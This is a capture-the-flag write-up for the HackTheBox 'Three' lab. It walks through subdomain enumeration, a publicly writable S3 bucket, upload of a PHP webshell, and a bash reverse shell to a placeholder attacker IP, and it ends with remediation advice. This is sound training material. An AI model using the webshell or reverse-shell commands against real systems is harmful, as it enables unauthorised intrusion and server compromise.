# Three

**Platform:** HackTheBox — Starting Point  
**Category:** Web Application Attacks  
**OS:** Linux  
**Difficulty:** Very Easy  
**Date:** 2025  

---

## Summary
This machine exposed a web application that revealed a subdomain 
through its contact page. The subdomain pointed to an Amazon S3 
bucket configured with public write access. By uploading a PHP 
webshell directly to the S3 bucket and accessing it through the 
web server, remote code execution was achieved and the flag 
was retrieved.

---

## Recon

```bash
nmap -sV -sC 10.129.X.X -oN nmap.txt
```

Nmap revealed two open ports — SSH on port 22 and a web 
server on port 80.
```
22/tcp open  ssh    OpenSSH 7.6p1
80/tcp open  http   Apache httpd 2.4.29
```
The web server was the primary target. SSH noted for potential 
use later if credentials are found.

---

## Enumeration

**Step 1 — Browse the web application**

Browsed to the web application on port 80. The site appeared 
to be a simple band website. Examined every page carefully 
for information that could lead to further attack surfaces.

The contact page revealed an email address:
```
mail@thetoppers.htb
```
The domain `thetoppers.htb` was noted. Added it to /etc/hosts 
to ensure proper DNS resolution:

```bash
echo "10.129.X.X thetoppers.htb" | sudo tee -a /etc/hosts
```

**Step 2 — Subdomain enumeration**

With a domain name available, enumerated subdomains using 
Gobuster in DNS mode:

```bash
gobuster dns -d thetoppers.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -r 10.129.X.X
```

Gobuster discovered a subdomain:
```
Found: s3.thetoppers.htb
```
Added the subdomain to /etc/hosts:

```bash
echo "10.129.X.X s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

**Step 3 — Investigate the S3 subdomain**

Browsed to `http://s3.thetoppers.htb` — the response 
confirmed this is an Amazon S3 compatible storage service:

```json
{"status": "running"}
```

Used the AWS CLI to interact with the S3 bucket. Configured 
it with dummy credentials since the bucket appeared to allow 
unauthenticated access:

```bash
aws configure
# AWS Access Key ID: temp
# AWS Secret Access Key: temp
# Default region: us-east-1
# Default output format: json
```

Listed the contents of the S3 bucket:

```bash
aws s3 ls s3://thetoppers.htb \
  --endpoint-url http://s3.thetoppers.htb
```

Output:
```
2022-04-01 00:00:00       0 .htaccess
2022-04-01 00:00:00    7534 index.php
2022-04-01 00:00:00    2522 images/
```
The S3 bucket is serving the web application files directly. 
This means any file uploaded to the bucket is immediately 
accessible via the web server.

---

## Exploitation

**Step 1 — Create a PHP webshell**

Created a simple PHP webshell locally:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Step 2 — Upload webshell to S3 bucket**

Uploaded the webshell directly to the bucket root:

```bash
aws s3 cp shell.php s3://thetoppers.htb/ \
  --endpoint-url http://s3.thetoppers.htb
```

Output confirmed the upload:
```
upload: ./shell.php to s3://thetoppers.htb/shell.php
```
**Step 3 — Execute commands via webshell**

Accessed the webshell through the web server and tested 
remote code execution:

```bash
curl "http://thetoppers.htb/shell.php?cmd=whoami"
# www-data
```

Remote code execution confirmed. The web server is executing 
the uploaded PHP file.

**Step 4 — Find and read the flag**

```bash
curl "http://thetoppers.htb/shell.php?cmd=find+/+%2D name+flag.txt+2>/dev/null"

curl "http://thetoppers.htb/shell.php?cmd=cat+/var/www/html/flag.txt"
```

---

## Post-Exploitation
With remote code execution established via the webshell, 
the next step in a real penetration test would be upgrading 
to a full reverse shell for a more stable interactive session.

```bash
# Start listener on attack machine
nc -lvnp 4444

# Trigger reverse shell via webshell
curl "http://thetoppers.htb/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261'"

# After connecting — upgrade to full TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Key Lesson
This machine demonstrates a S3 bucket misconfiguration — 
a vulnerability that has been responsible for some of the 
largest data breaches in recent history. Amazon S3 buckets 
are designed to be private by default but are frequently 
misconfigured to allow public read or write access.

The attack chain here combined three techniques — subdomain 
enumeration to discover the S3 endpoint, bucket enumeration 
to understand what was stored there, and file upload to 
achieve remote code execution. The critical misconfiguration 
was that the S3 bucket had public write access enabled and 
its contents were served directly by the web server. This 
combination turned a storage misconfiguration into full 
server compromise.

S3 bucket misconfigurations are extremely common in real 
cloud environments. Security researchers regularly discover 
publicly accessible buckets containing sensitive data — 
database backups, credentials, customer data, and internal 
documents. When a bucket also has write access, the impact 
escalates from data exposure to remote code execution if 
the bucket contents are served by a web server.

In a real penetration test, always enumerate subdomains 
when a domain name is found — S3 buckets, development 
environments, and staging servers are frequently discovered 
this way. Tools like aws s3 ls with dummy credentials 
can interact with misconfigured buckets without needing 
valid AWS credentials.

The fix involves setting S3 bucket permissions to private, 
enabling S3 Block Public Access at the account level, 
never serving S3 bucket contents directly as a web root 
without strict access controls, and regularly auditing 
bucket permissions using AWS Trusted Advisor or third 
party cloud security tools.
